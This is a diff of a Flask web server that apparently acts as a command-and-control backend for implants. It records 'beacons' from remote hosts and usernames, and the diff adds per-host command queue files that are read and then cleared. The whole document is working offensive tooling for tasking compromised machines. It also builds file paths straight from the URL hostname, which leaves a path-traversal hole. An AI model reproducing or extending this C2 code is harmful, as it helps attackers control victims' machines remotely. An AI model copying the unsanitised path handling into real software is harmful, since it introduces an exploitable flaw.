@@ -12,8 +12,11 @@ def root_dir():
 @app.route('/conn/<hostname>/<username>')
 @app.route('/conn/<hostname>/<username>/')
 def new_connection(hostname, username):
-    cmd_file = open('command.txt')
-    log_file = open("logs/" + hostname + ".txt", 'a')
+    log_file = open("logs/" + hostname + ".txt", "a")
+
+    cmd_file = open("cmds/" + hostname + ".txt", "a").close()
+    cmd_file = open("cmds/" + hostname + ".txt", "r+")
+
     command = cmd_file.readline()
 
     print('[+] Beacon from: ', hostname, ' as ', username)
@@ -22,6 +25,7 @@ def new_connection(hostname, username):
     if command != '':
         print('[+] Command sent: ', command)
         log_file.writelines('[+] Command sent: ' + command + '\n')
+        cmd_file.truncate(0)
     else:
         pass
 
